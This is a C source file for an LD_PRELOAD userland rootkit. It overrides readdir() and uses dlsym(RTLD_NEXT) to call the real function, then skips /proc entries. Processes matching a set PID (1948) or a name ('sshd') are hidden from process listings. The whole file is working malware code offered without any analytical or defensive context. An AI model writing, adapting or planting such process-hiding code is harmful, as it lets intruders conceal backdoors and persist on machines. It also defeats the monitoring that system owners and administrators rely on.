#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>

// Uncomment only ONE of these lines at a time to select the hiding mode

//#define HIDE_BY_PID
#define HIDE_BY_NAME

#define PID_TO_HIDE "1948"
#define PROC_NAME_TO_HIDE "sshd"

static int should_hide(const char *pid) {
#ifdef HIDE_BY_PID
    return strcmp(pid, PID_TO_HIDE) == 0;
#endif
#ifdef HIDE_BY_NAME
    char path[256];
    snprintf(path, sizeof(path), "/proc/%s/cmdline", pid);
    FILE *file = fopen(path, "r");
    if (!file) return 0;
    char buffer[256] = {0};
    fread(buffer, 1, sizeof(buffer) - 1, file);
    fclose(file);
    return strstr(buffer, PROC_NAME_TO_HIDE) != NULL;
#endif
    return 0;
}

struct dirent *readdir(DIR *dirp) {
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    if (!original_readdir)
        original_readdir = dlsym(RTLD_NEXT, "readdir");

    struct dirent *entry;
    while ((entry = original_readdir(dirp)) != NULL) {
        if (entry->d_type == DT_DIR && strspn(entry->d_name, "0123456789") == strlen(entry->d_name)) {
            if (should_hide(entry->d_name)) continue;
        }
        return entry;
    }
    return NULL;
}



